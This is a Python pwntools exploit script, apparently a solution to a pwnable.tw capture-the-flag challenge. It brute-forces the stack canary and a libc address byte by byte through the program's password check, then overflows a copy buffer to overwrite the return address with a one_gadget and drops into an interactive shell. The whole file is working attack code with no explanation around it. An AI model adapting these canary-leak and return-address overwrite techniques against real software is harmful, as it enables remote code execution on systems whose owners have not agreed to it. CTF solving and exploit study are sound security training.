from pwn import *

io = remote('chall.pwnable.tw', 10205)

def leak_stack(length, init_byte):
    leak = b''
    for _ in range(length):
        for guess in range(0x1, 0x100):
            # avoid '\n'
            if guess == ord('\n'):
                continue
            io.recvuntil('>> ')
            io.send('1')
            io.recvuntil('Your passowrd :')
            io.sendline(init_byte + leak + bytes([guess]) + b'\0')
            status = io.recvlineS()
            if status == 'Login Success !\n':
                leak += bytes([guess])
                print(leak)
                break

        io.recvuntil('>> ')
        io.send('1')

    return leak

def stack_overflow(payload1, payload2):
    io.recvuntil('>> ')
    io.send('1')
    io.recvuntil('Your passowrd :')
    io.send(payload1)

    io.recvuntil('>> ')
    io.send('1')
    io.recvuntil('Your passowrd :')
    io.send(b'\0')

    io.recvuntil('>> ')
    io.send('3')
    io.recvuntil('Copy :')
    io.send(payload2)
    

# Leak canary
canary = leak_stack(0x10, b'')
stack_overflow(canary + b'A' * 0x30 + canary, b'A' * 0x10)

# Logout
io.recvuntil('>> ')
io.send('1')

# Leak libc address
libc_leak = leak_stack(0x6, canary)
libc_base = u64(libc_leak.ljust(8, b'\0')) - 0x3c4631
one_gadget = libc_base + 0xf0567 

# overwrite return address with one gadget
stack_overflow(canary + b'A' * 0x30 + canary + b'A' * 0x18 + p64(one_gadget), b'A' * 0x10)

# trigger one gadget
io.recvuntil('>> ')
io.send('2')

io.interactive()
